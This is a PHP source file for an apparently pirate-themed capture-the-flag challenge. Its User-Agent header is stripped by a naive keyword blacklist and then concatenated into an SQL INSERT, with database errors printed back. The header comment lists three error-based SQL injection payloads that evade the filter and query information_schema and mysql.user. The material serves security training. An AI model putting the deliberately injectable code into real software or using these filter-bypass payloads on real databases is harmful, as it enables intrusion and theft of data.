<?php
/*
magic_quotes_gps off
Error Based SQLi + simple WAF
	' oORr(1,2)=(selSELECTect * frFROMom(seleSELECTct name_const(version(),1),name_const(version(),1))a) anandd '1		
	' anIFd extractvalue(1,concat(0x3a,(selIFect table_name frFROMom infoORrmation_schema.tables limit 1,1))) anIFd '1
	'||(selorect@ frfromom mysql.user wheorre(@:=1)||@ group by elt(@:=!@,(selorect table_name frfromom infoorrmation_schema.tables limit 10,1))having min(0)))#
*/

include ('piratconfigololo.php');

if (isset ( $_COOKIE ['key'] ) && $_COOKIE ['key'] === KEY) {
	print '<h1>AGHRRRRR!! Ты украл наш флаг! ' . FLAG . '</h1>';
} else {
	setcookie ( 'key', '0', time () + 3600 * 24 * 31 );
}

include ('header.inc');

if (isset ( $_GET ['menu'] )) {
	switch ($_GET ['menu']) {
		case 1 :
			include ('menu1.txt');
			break;
		case 2 :
			include ('menu2.txt');
			break;
		case 3 :
			include ('menu3.txt');
			break;
		case 4 :
			include ('menu4.txt');
			break;
		case 5 :
			include ('menu5.txt');
			break;
		default :
			include ('menu.txt');
			break;
	}
} else {
	include ('menu.txt');
}

include ('footer.inc');

$blacklist = array ('select', 'where', 'and', 'not', 'if', 'union', 'or', 'substring', 'from', 'ascii');
$ua = str_ireplace ( $blacklist, '', $_SERVER ['HTTP_USER_AGENT'] );
if (strlen ( $ua ) > 180) { //default 140
	print '<br><h6><i>Filter Error: String too long.</i></h6>';
} else {
	mysql_query ( "INSERT INTO ua(useragent) VALUES ('" . $ua . "')" ) or die ( mysql_error () );
}

?>